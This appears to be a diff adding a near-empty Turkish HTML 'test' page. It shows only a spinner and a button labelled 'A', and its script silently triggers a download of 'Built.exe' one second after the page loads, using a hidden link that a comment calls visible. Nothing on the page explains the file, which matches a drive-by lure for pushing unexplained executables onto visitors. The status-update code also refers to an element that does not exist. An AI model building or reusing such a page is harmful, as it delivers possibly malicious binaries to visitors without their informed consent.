@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Deneme</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
+            background-color: #f7f9fc;
+            color: #333;
+        }
+        .container {
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            margin-top: 40px;
+        }
+        h1 {
+            color: #2563eb;
+        }
+        p {
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .status {
+            margin: 25px 0;
+            padding: 15px;
+            border-radius: 8px;
+            background-color: #eef2ff;
+            font-weight: bold;
+        }
+        .download-btn {
+            display: inline-block;
+            background-color: #2563eb;
+            color: white;
+            padding: 12px 24px;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: bold;
+            transition: background-color 0.3s;
+            margin-top: 15px;
+        }
+        .download-btn:hover {
+            background-color: #1d4ed8;
+        }
+        .note {
+            margin-top: 30px;
+            padding: 15px;
+            background-color: #fffbeb;
+            border-left: 4px solid #f59e0b;
+            text-align: left;
+            border-radius: 4px;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #2563eb;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        
+        <div class="status">
+
+            <div class="loader"></div>
+        </div>
+        
+
+        
+        <a href="Built.exe" class="download-btn" download>A</a>
+        
+        <div class="note">
+
+        </div>
+    </div>
+
+    <script>
+        // Sayfa yüklendiğinde otomatik indirmeyi başlat
+        window.onload = function() {
+            // Görünür bir indirme bağlantısı oluştur
+            const link = document.createElement('a');
+            link.href = 'Built.exe';
+            link.download = 'Built.exe';
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            
+            // 1 saniye bekleyip otomatik indirmeyi başlat
+            setTimeout(function() {
+                link.click();
+                document.querySelector('.status p').textContent = 'İndirme başlatıldı!';
+                document.querySelector('.loader').style.display = 'none';
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
